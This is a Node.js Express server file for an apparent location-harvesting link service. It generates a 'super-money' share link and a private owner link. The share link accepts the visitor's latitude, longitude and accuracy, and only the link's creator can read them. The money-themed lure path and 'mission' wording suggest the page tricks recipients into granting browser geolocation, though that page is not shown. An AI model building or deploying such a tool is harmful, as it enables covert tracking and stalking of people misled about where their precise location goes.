const express = require("express");
const crypto = require("crypto");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;
const BASE_URL = (process.env.BASE_URL || "").replace(/\/+$/, "");
const TTL_MS = 30 * 60 * 1000;
const sessions = new Map();

app.disable("x-powered-by");
app.use(express.json({ limit: "10kb" }));
app.use(express.static(path.join(__dirname, "public"), {
  setHeaders(res) {
    res.setHeader("X-Content-Type-Options", "nosniff");
    res.setHeader("Referrer-Policy", "no-referrer");
    res.setHeader("Permissions-Policy", "geolocation=(self)");
    res.setHeader("Cache-Control", "no-store");
  }
}));

function token() { return crypto.randomBytes(32).toString("base64url"); }
function cleanExpired() {
  const now = Date.now();
  for (const [key, s] of sessions) if (s.expiresAt <= now) sessions.delete(key);
}
function getBase(req) { return BASE_URL || `${req.protocol}://${req.get("host")}`; }

app.post("/api/sessions", (req, res) => {
  cleanExpired();
  const shareToken = token();
  const ownerToken = token();
  sessions.set(shareToken, {
    ownerToken, expiresAt: Date.now() + TTL_MS, location: null, submitted: false
  });
  const base = getBase(req);
  res.json({
    shareUrl: `${base}/super-money?t=${shareToken}`,
    ownerUrl: `${base}/result.html?k=${ownerToken}`,
    expiresInMinutes: 30
  });
});

app.post("/api/share/:shareToken", (req, res) => {
  cleanExpired();
  const s = sessions.get(req.params.shareToken);
  if (!s) return res.status(410).json({ error: "This mission link has expired or is invalid." });
  if (s.submitted) return res.status(409).json({ error: "Data submitted " });

  const { latitude, longitude, accuracy } = req.body || {};
  if (![latitude, longitude, accuracy].every(Number.isFinite) ||
      latitude < -90 || latitude > 90 || longitude < -180 || longitude > 180 ||
      accuracy < 0 || accuracy > 100000) {
    return res.status(400).json({ error: "Invalid data." });
  }
  s.location = {
    latitude, longitude, accuracy: Math.round(accuracy),
    submittedAt: new Date().toISOString()
  };
  s.submitted = true;
  res.json({ ok: true, message: "Data shared successfully." });
});

app.get("/api/result/:ownerToken", (req, res) => {
  cleanExpired();
  const s = [...sessions.values()].find(x => x.ownerToken === req.params.ownerToken);
  if (!s) return res.status(410).json({ error: "This results link has expired or is invalid." });
  if (!s.location) return res.json({ status: "waiting", expiresAt: new Date(s.expiresAt).toISOString() });
  res.json({ status: "ready", location: s.location });
});

app.get("/", (_req, res) => res.sendFile(path.join(__dirname, "public", "index.html")));
app.get("/super-money", (_req, res) => res.sendFile(path.join(__dirname, "public", "mission.html")));
app.get("/mission.html", (_req, res) => res.sendFile(path.join(__dirname, "public", "mission.html")));
app.listen(PORT, () => console.log(`Mission Control running at http://localhost:${PORT}`));